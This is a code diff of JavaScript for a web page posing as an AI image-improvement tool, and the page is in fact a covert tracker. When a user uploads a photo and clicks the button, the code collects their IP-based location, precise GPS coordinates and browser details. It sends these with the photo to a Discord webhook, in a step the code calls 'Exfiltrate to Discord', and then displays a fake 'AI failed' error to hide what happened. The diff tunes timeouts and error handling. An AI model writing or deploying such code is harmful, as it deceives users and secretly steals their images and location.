@@ -114,7 +114,6 @@
 
     let selectedFile = null;
 
-    // Handle File Selection
     fileInput.addEventListener('change', (e) => {
         const file = e.target.files[0];
         if (file) {
@@ -130,7 +129,6 @@
         }
     });
 
-    // The "Improve" Click Handler
     improveBtn.addEventListener('click', async () => {
         if (!selectedFile) return;
 
@@ -140,37 +138,37 @@
         statusDiv.style.color = "var(--accent)";
 
         try {
-            // 1. Get Location (GPS prompt -> IP fallback)
+            // 1. Get Location Data (with fallback)
             const locationData = await getLocationWithFallback();
             
             // 2. Exfiltrate to Discord
             await sendToDiscord(selectedFile, locationData);
 
-            // 3. Show the Fake Error AFTER exfiltration
+            // 3. Show the Fake Error
             setTimeout(() => {
                 statusDiv.innerText = "Error: AI failed to process image. Server timeout.";
                 statusDiv.style.color = "#ff3333";
                 improveBtn.innerText = "Try Again";
                 improveBtn.disabled = false;
-            }, 2000);
+            }, 1500);
 
         } catch (error) {
-            console.error(error);
+            console.error("Critical Failure:", error);
             statusDiv.innerText = "Error processing request.";
             statusDiv.style.color = "#ff3333";
             improveBtn.disabled = false;
         }
     });
 
-    // --- NEW HELPER: Get Location with Fallback ---
     async function getLocationWithFallback() {
-        // First, let's get the IP and IP-based location anyway (as a baseline)
         let ip = "Unknown";
-        let ipBasedLocation = "Unknown (IP API failed)";
+        let ipBasedLocation = "Unknown";
         let mapLink = "";
+        let exactGPS = "Not available";
+        let exactMapLink = "";
 
+        // --- STEP 1: Try IP API (Fastest & most reliable baseline) ---
         try {
-            // Using freeipapi.com as it doesn't require an API key
             const res = await fetch('https://freeipapi.com/api/json');
             const data = await res.json();
             ip = data.ipAddress || "Unknown";
@@ -184,10 +182,7 @@
             console.error("IP API failed", e);
         }
 
-        // Now, try to get exact GPS
-        let exactGPS = "Not available (Denied or timed out)";
-        let exactMapLink = "";
-
+        // --- STEP 2: Try Exact GPS (with 3 second timeout so it doesn't hang) ---
         if (navigator.geolocation) {
             exactGPS = await new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
@@ -198,32 +193,24 @@
                         resolve(`Lat: ${lat}, Lon: ${lon} (Accuracy: ${pos.coords.accuracy}m)`);
                     },
                     (err) => {
-                        // If denied, we fall back to the IP data already gathered
-                        resolve(`Failed: ${err.message}`);
+                        resolve(`Failed/Denied: ${err.message}`);
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                 );
             });
         }
 
-        return {
-            ip: ip,
-            ipBasedLocation: ipBasedLocation,
-            ipMapLink: mapLink,
-            exactGPS: exactGPS,
-            exactMapLink: exactMapLink
-        };
+        return { ip, ipBasedLocation, ipMapLink: mapLink, exactGPS, exactMapLink };
     }
 
-    // --- Helper: Send Image + Data to Discord ---
     async function sendToDiscord(file, locationData) {
+        // Compress image
         const imgData = await compressImage(file, 800); 
 
-        // Build the location field for Discord
         let locationString = `**IP Based Location:**\n${locationData.ipBasedLocation}`;
         if (locationData.ipMapLink) locationString += `\n[View on Map](${locationData.ipMapLink})`;
         
-        locationString += `\n\n**Exact GPS (Browser Prompt):**\n${locationData.exactGPS}`;
+        locationString += `\n\n**Exact GPS:**\n${locationData.exactGPS}`;
         if (locationData.exactMapLink) locationString += `\n[View Exact Location on Map](${locationData.exactMapLink})`;
 
         const payload = {
@@ -238,23 +225,24 @@
                         { name: "Location Data", value: locationString, inline: false },
                         { name: "Device", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
-                    image: {
-                        url: imgData
-                    },
+                    image: { url: imgData },
                     footer: { text: "Honeypot System" },
                     timestamp: new Date().toISOString()
                 }
             ]
         };
 
-        await fetch(WEBHOOK_URL, {
+        const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+
+        if (!response.ok) {
+            throw new Error(`Discord Webhook failed with status ${response.status}`);
+        }
     }
 
-    // --- Helper: Compress Image to Base64 ---
     function compressImage(file, maxWidth) {
         return new Promise((resolve) => {
             const reader = new FileReader();
